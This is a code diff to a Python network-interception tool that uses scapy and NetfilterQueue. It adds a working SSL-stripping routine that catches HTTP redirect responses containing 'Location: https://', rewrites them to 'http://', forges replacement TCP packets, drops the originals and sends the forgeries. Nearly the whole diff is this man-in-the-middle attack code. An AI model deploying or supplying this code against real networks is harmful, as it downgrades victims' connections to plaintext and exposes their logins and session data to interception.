@@ -1,4 +1,4 @@
-from scapy.all import Ether, TCP, IP, UDP, Raw, wrpcap 
+from scapy.all import Ether, TCP, IP, UDP, Raw, wrpcap, send 
 from networking import *
 from netfilterqueue import NetfilterQueue
 import os
@@ -51,6 +51,7 @@ def ssl_strip(pkt, pkt_handler):
         decoded_pkt = scapy_pkt[Raw].load.decode()
 
         # if TCP in scapy_pkt and scapy_pkt[TCP].dport == 80 and "Upgrade-Insecure-Requests" in str(scapy_pkt[Raw].load) and scapy_pkt[Ether].dst == gateway_mac:
+        '''
         if "Upgrade-Insecure-Requests" in str(scapy_pkt[Raw].load):
             print("Prev_Load:", scapy_pkt[Raw].load)
 
@@ -60,14 +61,42 @@ def ssl_strip(pkt, pkt_handler):
 
             # pkt.set_payload(scapy_pkt[Raw].load)
             pkt.set_payload(bytes(new_pkt_load))
+        '''
+        if "Location: https://" in decoded_pkt:
+            print("Prev_Load:", scapy_pkt[Raw].load)
+
+            tmp_pkt_load = decoded_pkt.replace("https://", "http://")
+
+            ip = IP(src=scapy_pkt.src, dst=scapy_pkt.dst)
+            tcp = TCP(sport=scapy_pkt[TCP].sport, dport=scapy_pkt.dport, flags="PA")
+
+            packet = ip/tcp/tmp_pkt_load
+
+            packet[IP].chksum = None
+            packet[TCP].chksum = None  
+
+            print("New_Load:", packet)
+            print(packet[Raw].load)
+            
+            pkt_handler.add(packet)
+            pkt.drop()
+            send(packet)
+            
+        else:
+            pkt_handler.add(scapy_pkt)
+            pkt.accept()
+            print("New_Load:", pkt.get_payload())
 
             
     except:
-        pass
+        pkt_handler.add(scapy_pkt)
+        pkt.accept()
+        print("New_Load:", pkt.get_payload())
+        #pass
 
-    print("New_Load:", pkt.get_payload())
-    pkt_handler.add(scapy_pkt)
-    pkt.accept()
+    #print("New_Load:", pkt.get_payload())
+    #pkt_handler.add(scapy_pkt)
+    #pkt.accept()
 
 # Input: Scapy packet capture
 # Description: Creates a packet_log.pcap file & a more detailed packet_log.txt file
